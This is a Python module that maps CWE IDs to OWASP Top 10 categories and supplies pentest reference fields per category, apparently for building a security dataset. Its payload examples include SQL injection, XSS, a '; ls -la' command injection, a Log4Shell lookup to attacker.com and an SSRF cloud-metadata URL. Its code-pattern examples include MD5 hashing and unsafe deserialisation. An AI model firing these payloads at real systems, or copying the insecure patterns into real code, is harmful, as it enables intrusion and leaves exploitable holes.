"""
owasp_mapper.py
---------------
Static OWASP mapping module — no crawling needed.
Provides:
  1. CWE → OWASP Top 10 category mapping
  2. OWASP category → pentesting methods, payload examples, detection signals
     (sourced from OWASP WSTG + OWASP Top 10)

Used by build_dataset.py to enrich records with pentesting layer fields:
  owasp_category, attack_method, payload_example, detection_signals
"""

# ── CWE → OWASP Top 10 (2021) ─────────────────────────────────────────────
CWE_TO_OWASP = {
    # A01 Broken Access Control
    "CWE-22":   "A01:2021-Broken Access Control",
    "CWE-23":   "A01:2021-Broken Access Control",
    "CWE-284":  "A01:2021-Broken Access Control",
    "CWE-285":  "A01:2021-Broken Access Control",
    "CWE-639":  "A01:2021-Broken Access Control",
    "CWE-732":  "A01:2021-Broken Access Control",

    # A02 Cryptographic Failures
    "CWE-259":  "A02:2021-Cryptographic Failures",
    "CWE-327":  "A02:2021-Cryptographic Failures",
    "CWE-331":  "A02:2021-Cryptographic Failures",

    # A03 Injection
    "CWE-89":   "A03:2021-Injection",
    "CWE-77":   "A03:2021-Injection",
    "CWE-78":   "A03:2021-Injection",
    "CWE-79":   "A03:2021-Injection",
    "CWE-94":   "A03:2021-Injection",
    "CWE-943":  "A03:2021-Injection",

    # A04 Insecure Design
    "CWE-209":  "A04:2021-Insecure Design",
    "CWE-306":  "A04:2021-Insecure Design",

    # A05 Security Misconfiguration
    "CWE-16":   "A05:2021-Security Misconfiguration",
    "CWE-611":  "A05:2021-Security Misconfiguration",

    # A06 Vulnerable Components
    "CWE-1104": "A06:2021-Vulnerable and Outdated Components",

    # A07 Auth Failures
    "CWE-287":  "A07:2021-Identification and Authentication Failures",
    "CWE-297":  "A07:2021-Identification and Authentication Failures",
    "CWE-384":  "A07:2021-Identification and Authentication Failures",

    # A08 Software Integrity Failures
    "CWE-502":  "A08:2021-Software and Data Integrity Failures",

    # A09 Logging Failures
    "CWE-117":  "A09:2021-Security Logging and Monitoring Failures",
    "CWE-223":  "A09:2021-Security Logging and Monitoring Failures",

    # A10 SSRF
    "CWE-918":  "A10:2021-Server-Side Request Forgery",
}

# ── OWASP category → pentest intelligence ─────────────────────────────────
OWASP_PENTEST = {
    "A01:2021-Broken Access Control": {
        "attack_method":    "Manipulate URL parameters, JWT tokens, or IDOR references to access unauthorized resources",
        "payload_example":  "/api/users/1 → /api/users/2 (change numeric ID to access another user)",
        "detection_signals": [
            "missing authorization checks",
            "predictable resource identifiers",
            "no role-based access enforcement",
            "direct object reference without ownership validation"
        ],
        "tool_used":        "Burp Suite, OWASP ZAP",
        "code_pattern":     "GET /resource/{id} without ownership check"
    },
    "A02:2021-Cryptographic Failures": {
        "attack_method":    "Intercept traffic or access stored data to exploit weak or missing encryption",
        "payload_example":  "Downgrade HTTPS to HTTP, crack MD5-hashed password offline",
        "detection_signals": [
            "HTTP instead of HTTPS",
            "MD5 or SHA1 password hashing",
            "hardcoded encryption keys",
            "sensitive data in logs or error messages"
        ],
        "tool_used":        "Wireshark, Hashcat, SSLyze",
        "code_pattern":     "hashlib.md5(password.encode()).hexdigest()"
    },
    "A03:2021-Injection": {
        "attack_method":    "Inject malicious payloads into input fields to manipulate query execution",
        "payload_example":  "' OR 1=1 --  |  <script>alert(1)</script>  |  ; ls -la",
        "detection_signals": [
            "dynamic query construction",
            "user input concatenated into SQL/command",
            "no prepared statements or parameterized queries",
            "unsanitized template rendering"
        ],
        "tool_used":        "sqlmap, XSStrike, commix",
        "code_pattern":     "query = 'SELECT * FROM users WHERE id=' + user_input"
    },
    "A04:2021-Insecure Design": {
        "attack_method":    "Exploit missing security controls at architecture level — e.g. no rate limiting, no anti-automation",
        "payload_example":  "Brute force OTP endpoint with no rate limit; enumerate user accounts via error messages",
        "detection_signals": [
            "no rate limiting on sensitive endpoints",
            "verbose error messages leaking stack traces",
            "no security design review artifacts"
        ],
        "tool_used":        "Burp Intruder, custom scripts",
        "code_pattern":     "No rate-limit middleware on /api/login"
    },
    "A05:2021-Security Misconfiguration": {
        "attack_method":    "Access default credentials, exposed admin panels, or misconfigured cloud storage",
        "payload_example":  "admin:admin login attempt; access s3://bucket-name/config.env directly",
        "detection_signals": [
            "default credentials unchanged",
            "debug mode enabled in production",
            "directory listing enabled",
            "unnecessary services exposed",
            "S3 bucket publicly readable"
        ],
        "tool_used":        "Nikto, Nmap, ScoutSuite",
        "code_pattern":     "DEBUG=True in production Django settings"
    },
    "A06:2021-Vulnerable and Outdated Components": {
        "attack_method":    "Identify outdated libraries with known CVEs and exploit published PoCs",
        "payload_example":  "Log4Shell: ${jndi:ldap://attacker.com/exploit} in User-Agent header",
        "detection_signals": [
            "outdated dependency versions in package.json/requirements.txt",
            "components with published CVEs",
            "no automated dependency scanning"
        ],
        "tool_used":        "Dependabot, Trivy, OWASP Dependency-Check",
        "code_pattern":     "log4j-core:2.14.1 in pom.xml"
    },
    "A07:2021-Identification and Authentication Failures": {
        "attack_method":    "Brute force credentials, exploit weak session tokens, or bypass MFA",
        "payload_example":  "admin:password123 | session token prediction attack | token reuse after logout",
        "detection_signals": [
            "no account lockout policy",
            "weak or predictable session IDs",
            "passwords not hashed with bcrypt/argon2",
            "no MFA for privileged accounts"
        ],
        "tool_used":        "Hydra, Burp Suite, jwt_tool",
        "code_pattern":     "session_id = str(user_id) + timestamp"
    },
    "A08:2021-Software and Data Integrity Failures": {
        "attack_method":    "Supply chain attack via malicious package or tampered CI/CD pipeline",
        "payload_example":  "npm install malicious-package (typosquatting); unsigned update delivered via MITM",
        "detection_signals": [
            "no integrity checks on dependencies",
            "unsigned software updates",
            "untrusted deserialization of user data"
        ],
        "tool_used":        "Socket.dev, Snyk, Sigstore",
        "code_pattern":     "pickle.loads(user_supplied_data)"
    },
    "A09:2021-Security Logging and Monitoring Failures": {
        "attack_method":    "Operate undetected by exploiting absence of logging or alerting",
        "payload_example":  "Repeated failed logins with no alert triggered; SQLi attempts not logged",
        "detection_signals": [
            "no centralized logging (SIEM)",
            "authentication events not logged",
            "no alerting on suspicious activity"
        ],
        "tool_used":        "Manual audit, log review",
        "code_pattern":     "except Exception: pass  # silent failure"
    },
    "A10:2021-Server-Side Request Forgery": {
        "attack_method":    "Make the server issue requests to internal services using attacker-controlled URL input",
        "payload_example":  "url=http://169.254.169.254/latest/meta-data/ (AWS metadata endpoint)",
        "detection_signals": [
            "user-controlled URL in server-side fetch",
            "no URL allowlist validation",
            "access to cloud metadata endpoints possible"
        ],
        "tool_used":        "Burp Suite, SSRFmap",
        "code_pattern":     "requests.get(user_supplied_url)"
    }
}

def get_owasp_category(cwe_id: str) -> str:
    """Map CWE ID to OWASP Top 10 category. Returns 'Unknown' if no match."""
    return CWE_TO_OWASP.get(cwe_id, "Unknown")

def get_pentest_intel(owasp_category: str) -> dict:
    """Return pentesting fields for a given OWASP category."""
    return OWASP_PENTEST.get(owasp_category, {
        "attack_method":     "Manual testing required",
        "payload_example":   "",
        "detection_signals": [],
        "tool_used":         "Manual review",
        "code_pattern":      ""
    })